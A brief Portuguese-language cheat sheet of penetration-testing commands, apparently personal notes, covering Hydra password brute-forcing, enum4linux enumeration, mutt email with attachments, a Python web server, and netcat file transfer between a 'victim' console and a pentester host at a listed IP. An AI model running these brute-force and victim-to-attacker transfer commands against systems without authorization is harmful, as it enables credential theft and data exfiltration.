HYDRA -l {usuario ou wordlist.txt} -P {senha ou wordslist.txt} {IP} http-head -V
- Brute Forçe em usuario Linux
---------------------------------------------------------------------------------
ENUM4LINUX
- enumera infomaçoes do sistema.
---------------------------------------------------------------------------------
MUTT
- Sistema automatico de envio de gmail.
- echo 'Teste com anexo' | mutt -s 'Assunto teste com anexo' -a arquivos -- destinatario@gmail.com
---------------------------------------------------------------------------------
PYTHON -m http.server 8080
- Cria um Servidor Basico na Porta Escolhida.
---------------------------------------------------------------------------------
NETCAT
- nc pode ser utilizado para transferir arquivo com o  simbulos (<,>).
- exemplo nc 52.237.27.64 666 > arquivo - console da vitima || nc -lvp 666 < arquivo - console do pentester.
